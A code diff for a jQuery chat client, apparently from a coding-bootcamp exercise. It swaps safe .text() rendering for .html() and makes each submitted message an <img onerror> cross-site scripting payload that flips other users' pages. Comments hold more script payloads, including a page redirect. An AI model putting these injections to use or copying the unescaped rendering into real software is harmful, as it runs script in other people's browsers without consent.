@@ -58,7 +58,7 @@ app.fetch = function() {
       var $messageDiv = $('<div class="text"></div>');
       var $userDiv = $('<div class="username" onclick="app.handleUsernameClick()"></div>');
       var $chatBody = $('<div class="chatBody"></div>');
-      $messageDiv.text(text);
+      $messageDiv.html(text);
       $userDiv.text(username);
       $userDiv.appendTo($chatBody);
       $messageDiv.appendTo($chatBody);
@@ -105,31 +105,32 @@ var submitMessage = function() {
 
   var text = $('#message').val();
   var message = {
-    username: 'hackReactorHacker',
-    text: text,
+    username: 'NotRob',
+    text: `<img src=x.jpg onerror="$('body').css({'unicode-bidi':'bidi-override','direction':'rtl','-webkit-transform':'rotateY(180deg)'})">`,
     roomname: 'hacks'
   };
 
   app.send(message);
 };
 
-// app.testMessage = function() {
-//   // $('body').css({'unicode-bidi':'bidi-override','direction':'rtl'})
+app.testMessage = function() {
+  // $('body').css({'unicode-bidi':'bidi-override','direction':'rtl'})
+  // $('body').css({'unicode-bidi':'bidi-override','direction':'rtl','-webkit-transform':'rotateY(180deg)'})
+  console.log('hello');
+  var $messageDiv = $('<div class="text"></div>');
+  var $userDiv = $('<div class="username" onclick="app.handleUsernameClick()"></div>');
+  var test = `<img src=x.jpg onerror="$('body').css({'unicode-bidi':'bidi-override','direction':'rtl','-webkit-transform':'rotateY(180deg)'})">`
+  var $chatBody = $('<div class="chatBody"></div>');
+  $messageDiv.text(test);
+  // $user.Div.text();
+  $userDiv.text('me');
+  $userDiv.appendTo($chatBody);
+  $messageDiv.appendTo($chatBody);
+  $chatBody.appendTo($("#chats"));
 
-//   console.log('hello');
-//   var $messageDiv = $('<div class="text"></div>');
-//   var $userDiv = $('<div class="username" onclick="app.handleUsernameClick()"></div>');
-//   var $chatBody = $('<div class="chatBody"></div>');
-//   $messageDiv.text('itsame');
-//   // $user.Div.text();
-//   $userDiv.text(   `>>>); $('body').css({'unicode-bidi':'bidi-override','direction':'rtl','-webkit-transform':'rotateY(180deg)','-moz-transform':'rotateY(180deg)','-o-transform':'rotateY(180deg)','-ms-transform':'rotateY(180deg)'});(console.log('don't mind me')`     );
-//   $userDiv.appendTo($chatBody);
-//   $messageDiv.appendTo($chatBody);
-//   $chatBody.appendTo($("#chats"));
-
-// };
+};
 
   // $userDiv.text(   ); $('body').css({'unicode-bidi':'bidi-override','direction':'rtl','-webkit-transform':'rotateY(180deg)','-moz-transform':'rotateY(180deg)','-o-transform':'rotateY(180deg)','-ms-transform':'rotateY(180deg)'});(console.log('Rob says hi!')     );
-
-
+//<script> window.location.replace("https://www.youtube.com/watch?v=oHg5SJYRHA0") </script>
+//<script>$('body').css({'unicode-bidi':'bidi-override','direction':'rtl','-webkit-transform':'rotateY(180deg)','-moz-transform':'rotateY(180deg)','-o-transform':'rotateY(180deg)','-ms-transform':'rotateY(180deg)'})</script>
 //<img src=x.jpg onerror="$(`body`).css({`unicode-bidi`:`bidi-override`,`direction`:`rtl`})">
